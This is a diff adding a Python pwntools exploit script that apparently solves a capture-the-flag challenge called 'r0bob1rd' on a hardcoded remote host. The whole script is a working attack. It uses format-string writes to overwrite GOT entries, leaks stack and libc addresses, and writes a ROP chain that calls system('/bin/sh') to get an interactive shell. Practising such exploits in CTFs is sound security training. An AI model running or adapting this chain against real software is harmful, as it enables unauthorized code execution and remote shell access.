@@ -1,0 +1,62 @@
+#!/usr/bin/env python3
+
+from pwn import *
+
+exe = context.binary = ELF('./r0bob1rd')
+libc = ELF('./glibc/libc.so.6')  # Charge la libc
+context.log_level = 'info'
+
+def start(argv=[], *a, **kw):
+    if args.REMOTE:
+        return remote('94.237.61.52', 30447, *a, **kw)
+    else:
+        return process(['./r0bob1rd'] + argv, *a, **kw)
+
+args.REMOTE = True
+io = start()
+
+offset = 8
+write = {
+    exe.got["__stack_chk_fail"]: exe.sym["operation"]
+}
+
+payload = fmtstr_payload(offset, write, write_size='short')
+payload = payload.ljust(106, b".")
+io.sendlineafter(b">", b"10")
+io.sendafter(b">", payload)
+
+payload = f"hehe|%22$p|%45$p|".encode()
+payload = payload.ljust(106, b".")
+io.sendafter(b">", payload)
+
+io.recvuntil(b"hehe|")
+leaks = io.recvline().split(b"|")
+stack = int(leaks[0], 16) - 0x1a8
+libc_base = int(leaks[1], 16) - 0x24083
+libc.address = libc_base  # Maintenant ça fonctionne
+
+write = {
+    exe.got["fgets"]: libc.sym["gets"]
+}
+
+payload = fmtstr_payload(offset, write, write_size='short')
+payload = payload.ljust(106, b".")
+io.sendafter(b">", payload)
+
+sh = next(libc.search(b"/bin/sh\0"))
+system = libc.sym["system"]
+pop_rdi = 0x400cc3
+ret = 0x040074e
+
+write = {
+    stack: pop_rdi,
+    stack + 8: sh,
+    stack + 16: ret,
+    stack + 24: system
+}
+
+payload = fmtstr_payload(offset, write, write_size='short')
+io.sendafter(b">", payload)
+
+io.sendline("trigger")
+io.interactive()
